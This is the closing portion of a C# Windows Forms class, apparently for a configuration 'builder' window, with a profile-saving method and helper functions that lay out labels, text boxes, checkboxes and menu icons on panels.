            if (File.Exists(o.IconPath))
                try { picIcon.Image = new Icon(o.IconPath).ToBitmap(); } catch { }
        }

        private void SaveProfile() => BuilderProfile.Save(CollectOptions(""), "Default");

        // ─────────────────────────────────────────────────────────────────────
        //  Layout helpers (operate on Panel, not TabPage)
        // ─────────────────────────────────────────────────────────────────────

        private static TextBox Tb(string text = "", int maxLen = 0)
        {
            var t = new TextBox { Text = text };
            if (maxLen > 0) t.MaxLength = maxLen;
            return t;
        }

        private static void Sec(Panel p, string title, ref int y)
        {
            p.Controls.Add(new Label
            {
                Text = title, Left = 20, Top = y, AutoSize = true,
                Font = new Font("Segoe UI", 8.25f, FontStyle.Bold),
            });
            y += 18;
            p.Controls.Add(new Label
            {
                Left = 20, Top = y, Height = 1,
                BackColor = C_Divider,
                Width = 360,
                Anchor = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top,
            });
            y += 6;
        }

        private static void Desc(Panel p, string text, ref int y)
        {
            p.Controls.Add(new Label
            {
                Text = text, Left = 20, Top = y, Width = 360, Height = 28,
                AutoSize = false, ForeColor = SystemColors.GrayText,
            });
            y += 28;
        }

        private static void Row(Panel p, string label, TextBox ctrl, ref int y)
        {
            p.Controls.Add(new Label { Text = label, Left = 20, Top = y + 3, Width = 155, AutoSize = false });
            ctrl.Left = 182; ctrl.Top = y; ctrl.Width = 201; ctrl.Height = 22;
            p.Controls.Add(ctrl);
            y += 28;
        }

        private static void Chk(Panel p, CheckBox chk, ref int y)
        {
            chk.Left = 20; chk.Top = y; chk.AutoSize = true;
            p.Controls.Add(chk);
            y += 24;
        }

        private static void Lbl(Panel p, string text, int x, int y)
            => p.Controls.Add(new Label { Text = text, Left = x, Top = y, AutoSize = true });

        private static void TryMenuIcon(ToolStripMenuItem item, params string[] names)
        {
            foreach (var name in names)
            {
                var img = IconLoader.Load(name);
                if (img is not null) { item.Image = img; return; }
            }
        }
    }
}
